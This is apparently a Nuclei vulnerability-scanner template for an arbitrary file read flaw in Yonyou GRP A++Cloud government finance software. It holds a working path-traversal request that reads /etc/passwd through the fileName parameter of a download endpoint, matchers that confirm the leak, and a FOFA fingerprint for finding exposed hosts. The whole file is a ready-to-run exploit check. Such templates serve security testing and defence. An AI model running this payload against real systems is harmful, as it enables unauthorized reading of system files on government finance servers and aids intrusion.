id: poc-yaml-yongyon-grp-government-finance-cloud-anyfile-read
info:
  name: 用友GRP A++Cloud政府财务云 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
  metadata:
    finger: 用友GRP A++Cloud政府财务云
    fofa: body="/pf/portal/login/css/fonts/style.css"

http:
  - raw:
      - |
        GET /ma/emp/maEmp/download?fileName=../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:"
          - "/bin"
      - type: word
        part: header
        words:
          - "filename=../../../etc/passwd"
      - type: word
        part: body
        words:
          - "<"
        negative: true
